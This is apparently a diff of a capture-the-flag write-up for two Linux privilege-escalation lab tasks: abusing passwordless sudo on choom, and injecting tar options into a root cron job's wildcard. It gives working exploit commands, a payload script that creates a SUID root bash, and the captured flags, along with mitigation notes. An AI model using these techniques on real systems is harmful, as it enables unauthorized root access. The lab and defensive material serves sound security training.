@@ -1,188 +1,233 @@
-# 0x01 Linux Privilege Escalation — Task 1 (`choom`)
+# 0x01 Linux Privilege Escalation
+
+Cyber Shell 0x02 — Linux privilege escalation tasks.  
+Default access: `ssh user@<target-ip>` (password: `user`)
+
+| Task | Technique | Flag file |
+|------|-----------|-----------|
+| 1 | Sudo misconfiguration (`choom`) | `0-flag.txt` |
+| 2 | Cron + writable path + `tar` wildcards | `1-flag.txt` |
+
+---
+
+# Task 1 — Sudo + `choom`
 
 ## Objective
 
-Gain elevated (root) privileges on the Linux target and read the flag at:
+Gain root and read `/root/flag.txt`.
 
-```text
-/root/flag.txt
-```
-
-**Target:** Cyber Shell 0x02 — Linux Privesc Task 1  
-**Access:** `ssh user@<target-ip>` (password: `user`)
-
----
-
-## Hint
-
-- Focus on **user permissions** and **available sudo commands**.
-- Leverage the **`choom`** command with sudo privileges to escalate and access restricted files.
-
----
+**Hint:** Focus on user permissions and available sudo commands. Leverage `choom` with sudo.
 
 ## Enumeration
-
-### 1. Who am I?
 
 ```bash
 whoami
 id
-hostname
-```
-
-Example output:
-
-```text
-user
-uid=1000(user) gid=1000(user) groups=1000(user)
-```
-
-### 2. Sudo rights (critical)
-
-```bash
 sudo -l
-```
-
-Result:
-
-```text
-User user may run the following commands on <host>:
-    (ALL) NOPASSWD: /usr/bin/choom
-```
-
-**Finding:** `user` can run `/usr/bin/choom` as **any user (including root)** with **no password**.
-
-### 3. What does `choom` do?
-
-```bash
 choom --help
 ```
 
-```text
-Usage:
- choom [options] -p pid
- choom [options] -n number -p pid
- choom [options] -n number command [args...]]
+Critical finding:
 
-Display and adjust OOM-killer score.
+```text
+User user may run the following commands:
+    (ALL) NOPASSWD: /usr/bin/choom
 ```
 
-`choom` is a util-linux tool for displaying/adjusting the **OOM killer score** of a process.  
-Importantly, it can also **execute a command** with a given adjust score:
+`choom` can run a command while adjusting the OOM score:
 
 ```text
 choom -n number command [args...]
 ```
 
-When that binary is run via `sudo`, the child command inherits **root** privileges.
-
-### 4. Other quick checks (good practice)
-
-```bash
-# Processes
-ps aux
-
-# Cron / scheduled tasks
-ls -la /etc/cron* 2>/dev/null
-crontab -l 2>/dev/null
-cat /etc/crontab 2>/dev/null
-
-# SUID/SGID binaries
-find / -perm -4000 -type f 2>/dev/null
-find / -perm -2000 -type f 2>/dev/null
-
-# Writable paths / interesting permissions
-find / -writable -type d 2>/dev/null | head
-ls -la /etc/sudoers.d/
-
-# Confirm flag location is blocked as normal user
-ls /root/
-cat /root/flag.txt
-# -> Permission denied
-```
-
-For this task, **sudo on `choom`** is the intended path.
-
----
+With passwordless sudo, that child command runs as **root**.
 
 ## Exploitation
 
-### Why it works
-
-| Step | Detail |
-|------|--------|
-| Misconfiguration | `NOPASSWD: /usr/bin/choom` in sudoers |
-| Capability abuse | `choom -n <score> <command>` runs `<command>` |
-| Result | Command runs as **root** |
-
-This is a classic **GTFOBins-style** sudo abuse: a “harmless” admin utility that can spawn arbitrary programs.
-
-### Exploit commands
-
-Confirm root:
-
 ```bash
+# Confirm root
 sudo /usr/bin/choom -n 0 id
-```
 
-```text
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-Read the flag:
-
-```bash
+# Read flag
 sudo /usr/bin/choom -n 0 cat /root/flag.txt
+
+# Optional root shell (use -- so child options are not parsed by choom)
+sudo /usr/bin/choom -n 0 -- /bin/bash
 ```
 
-Interactive root shell (optional):
-
-```bash
-sudo /usr/bin/choom -n 0 /bin/bash
-# or, if options clash with the child command:
-sudo /usr/bin/choom -n 0 -- /bin/bash -p
-```
-
-List `/root` (use `--` so options are not eaten by `choom`):
-
-```bash
-sudo /usr/bin/choom -n 0 -- ls -la /root/
-```
-
----
-
-## Flag
+## Flag (Task 1)
 
 ```text
 24acbe7f1dcbe1d34dfe5d6117cf4d6b
 ```
 
-Stored in this directory as `0-flag.txt`.
+Stored in `0-flag.txt`.
+
+## Why it works
+
+| Step | Detail |
+|------|--------|
+| Misconfiguration | `NOPASSWD: /usr/bin/choom` |
+| Abuse | `choom -n 0 <cmd>` executes `<cmd>` as the sudo user (root) |
+| Result | Arbitrary command execution as root |
 
 ---
+
+# Task 2 — Cron + `tar` wildcard injection
+
+## Objective
+
+Gain root via misconfigured cron / writable content executed as root, then read `/root/flag.txt`.
+
+**Vulnerable area:** Misconfigured cron jobs or writable scripts/content used by cron as root.  
+**Key fact:** The directory the root cron job operates on is writable by `user`.
+
+## Enumeration
+
+### 1. Identity & sudo
+
+```bash
+whoami
+id
+sudo -l
+```
+
+No useful passwordless sudo for this task (sudo may prompt for a password).
+
+### 2. Processes
+
+```bash
+ps aux
+```
+
+Note `cron` running as root — scheduled jobs may elevate.
+
+### 3. Cron jobs (critical)
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron*
+ls -la /etc/cron.d/
+cat /etc/cron.d/*
+crontab -l
+ls -la /var/spool/cron/crontabs 2>/dev/null
+```
+
+Critical finding in `/etc/cron.d/my-cron-job`:
+
+```text
+* * * * * root (cd /home/user/dropbox; /usr/bin/tar -czf /tmp/dropbox_backup.tar.gzz *) 2>&1
+```
+
+| Observation | Why it matters |
+|-------------|----------------|
+| Runs **every minute** | Fast feedback loop |
+| User is **root** | Anything tar does is root-level |
+| CWD is `/home/user/dropbox` | Owned/writable by `user` |
+| Command uses shell wildcard `*` | Filenames become extra arguments to `tar` |
+
+### 4. Writable path
+
+```bash
+ls -la /home/user/dropbox
+find /home/user -writable
+```
+
+`/home/user/dropbox` is writable by the low-priv user → we control the names expanded by `*`.
+
+## Exploitation — `tar` wildcard / checkpoint injection
+
+When the shell expands `*`, filenames starting with `-` are passed to `tar` as **options**, not archive members. GNU `tar` supports:
+
+- `--checkpoint=1`
+- `--checkpoint-action=exec=<command>`
+
+So we plant option-looking filenames and a payload script:
+
+```bash
+cd /home/user/dropbox
+
+# Payload executed as root by tar
+cat > shell.sh << 'EOF'
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+cat /root/flag.txt > /tmp/pwned_flag.txt
+chmod 644 /tmp/pwned_flag.txt
+EOF
+
+# Filenames that become tar options after glob expansion
+echo > '--checkpoint=1'
+echo > '--checkpoint-action=exec=sh shell.sh'
+
+ls -la
+```
+
+Effective command after cron runs (conceptually):
+
+```bash
+tar -czf /tmp/dropbox_backup.tar.gzz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh ...
+```
+
+Wait up to ~1 minute for cron, then:
+
+```bash
+cat /tmp/pwned_flag.txt
+# or
+/tmp/rootbash -p -c 'id; cat /root/flag.txt'
+```
+
+Cleanup (optional, good hygiene after CTF):
+
+```bash
+rm -f /home/user/dropbox/--checkpoint=1 \
+      /home/user/dropbox/'--checkpoint-action=exec=sh shell.sh' \
+      /home/user/dropbox/shell.sh
+```
+
+## Flag (Task 2)
+
+```text
+799c121a66af83890c716cfd0c0ad5aa
+```
+
+(`/root/flag.txt` content was: `your flag is 799c121a66af83890c716cfd0c0ad5aa`)  
+Stored in `1-flag.txt`.
+
+## Why it works
+
+```text
+Root cron every minute
+  -> cd /home/user/dropbox (user-writable)
+  -> tar ... *   (shell expands attacker-controlled names)
+  -> names like --checkpoint-action=exec=... run as root
+  -> SUID bash / flag dump
+```
 
 ## Mitigation (defender notes)
 
-1. **Least privilege:** Do not grant `sudo` on binaries that can execute arbitrary commands (`choom`, `find`, `vim`, `python`, `less`, etc.).
-2. **Prefer specific wrappers:** If OOM tuning is required, expose a tightly scoped script/service, not full `choom`.
-3. **Audit regularly:**
-
-   ```bash
-   sudo -l -U user
-   grep -R . /etc/sudoers /etc/sudoers.d/
-   ```
-
-4. Check [GTFOBins](https://gtfobins.github.io/) before allowing any sudo binary.
+1. Never run cron as root over **user-writable** directories.
+2. Avoid unquoted wildcards in privileged scripts; use explicit file lists or `find` with safe handling.
+3. Prefer absolute paths and fixed arguments; do not let untrusted filenames become CLI options.
+4. Harden backups: run as a dedicated low-priv user, write only to safe destinations, and drop privileges early.
+5. Audit: `grep -R . /etc/cron* /var/spool/cron` and check ownership of every path those jobs touch.
 
 ---
 
-## Summary
+# Quick reference
 
-```text
-SSH as user
-    -> sudo -l  (NOPASSWD: /usr/bin/choom)
-    -> sudo choom -n 0 cat /root/flag.txt
-    -> root / flag
+### Task 1
+
+```bash
+sudo /usr/bin/choom -n 0 cat /root/flag.txt
 ```
 
-**Technique:** Sudo misconfiguration + command execution via `choom` → privilege escalation to root.
+### Task 2
+
+```bash
+cd /home/user/dropbox
+echo 'cat /root/flag.txt > /tmp/pwned_flag.txt; chmod 644 /tmp/pwned_flag.txt' > shell.sh
+echo > '--checkpoint=1'
+echo > '--checkpoint-action=exec=sh shell.sh'
+# wait ~1 min
+cat /tmp/pwned_flag.txt
+```
